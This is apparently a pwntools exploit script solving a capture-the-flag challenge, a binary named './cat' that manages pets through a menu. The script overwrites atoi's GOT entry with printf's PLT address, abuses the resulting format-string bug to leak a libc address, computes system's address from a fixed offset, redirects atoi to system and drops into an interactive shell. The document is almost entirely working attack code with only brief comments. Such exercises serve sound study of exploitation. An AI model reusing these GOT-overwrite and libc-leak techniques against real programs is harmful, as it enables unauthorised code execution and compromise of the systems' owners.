from pwn import *

#Start the target process, and attach gdb
target = process('./cat')
#gdb.attach(target)

#Establish the needed constants for later
printf_plt = p64(0x4006d0)
atoi_got = p64(0x602068)
sys_offset = -0xb31f0

#Establish the various functions which we will need to interact with the program
def create_pet(name, pet_type, age):
	target.sendline('1')
	target.recvuntil('>')
	target.sendline(name)
	target.recvuntil('>')
	target.sendline(pet_type)
	target.recvuntil('>')
	target.sendline(age)
	target.recvuntil('>')

def create_pet_post_write(name, pet_type, age):
	target.sendline('1\x00')
	target.recvuntil('>')
	target.sendline(name)
	target.recvuntil('>')
	target.sendline(pet_type)
	target.recvuntil('>')

def edit_pet(index, name, pet_type, age, modify):
	target.sendline('2')
	target.recvuntil('>')
	target.sendline(index)
	target.recvuntil('>')
	target.sendline(name)
	target.recvuntil('>')
	target.sendline(pet_type)
	target.recvuntil('>')
	target.sendline(age)
	target.recvuntil('>')
	target.sendline(modify)
	target.recvuntil('>')

def edit_pet_post_write(index, name, pet_type, age, modify):
	target.sendline('22\x00')
	target.recvuntil('>')
	target.sendline(index)
	target.recvuntil('>')
	target.sendline(name)
	target.recvuntil('>')
	target.sendline(pet_type)
	target.recvuntil('>')
	target.sendline(age)
	target.recvuntil('>')
	target.sendline(modify)
	target.recvuntil('>')

def print_pet(index):
	target.sendline('3')
	target.recvuntil('>')
	target.sendline(index)
	target.recvuntil('>')
	name = target.recvline()
	kind = target.recvline()
	age = target.recvline()
	print "name: " + name
	print "kind: " + kind
	print "age: " + age
	target.recvuntil('>')


#Setup and execute the overwrite for the got address of atoi to the plt address of printf
target.recvuntil('>')

create_pet('reverent', 'drummer', '16')
edit_pet('0', '789654123', '95175382', '16', 'n')
create_pet('reverent', atoi_got + p64(0x602100) + p64(0x602300), '16')
edit_pet('0', printf_plt, '15935728', '16', 'y')
print target.recvuntil('>')

#Leak the libc address, and calculate the address of system
target.sendline('%3$p')
leak = target.recvline()
leak = leak.replace("Invalid command! (=+_+=)\n", "")
leak = int(leak, 16)
system = leak + sys_offset
print "The leak is: " + hex(leak)
print "The address of system is: " + hex(system)

#Write over the got address of atoi with the plt address of printf
edit_pet_post_write('\x00', '789654123', '95175382', '1\x00', 'n')
create_pet_post_write('reverent', atoi_got + p64(0x602100) + p64(0x602300)[:6], '1\x00')
edit_pet_post_write('\x00', p64(system), '15935728', 'sh', 'n')

#Drop to an interactive shell
target.interactive()
